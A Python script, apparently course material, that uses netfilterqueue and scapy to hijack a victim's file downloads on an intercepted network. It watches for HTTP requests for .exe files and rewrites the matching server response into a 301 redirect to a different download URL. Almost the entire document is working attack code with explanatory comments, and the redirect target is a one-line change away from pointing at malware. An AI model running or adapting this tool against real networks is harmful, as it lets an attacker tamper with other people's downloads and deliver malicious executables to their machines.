#!/usr/bin/env python

# This script makes it possible to hijack the victims download file

import netfilterqueue
import scapy.all as scapy

ack_list = []


# This functions changes the load value and also we need to remove the len and chksum field in the IP layer
# and the chksum field in the TCP layer. This is because we have changed the content of the load and this will change
# the values. Scapy will recalculate the new values. This should be done everytime we alter a scapy packet
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Converts the packet to a scapy packet.
    # In the following if statement are checking if the http request contains an .exe file. If it does we add the ack number
    # from the TCP layer to the ack_list. It is this number that will match the seq number in the response.
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] .exe request")
                print("=======================================================================================================")
                print(scapy_packet.show())
        # In the following if statement are we checking if the seq number matches the ack number from ack_list.
        # And if it matches, we change the load content in the Raw layer to what we want.
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                print("=======================================================================================================")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar600.exe\n\n")
                packet.set_payload(bytes(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Keyboard Interrupt detected. Exiting program")

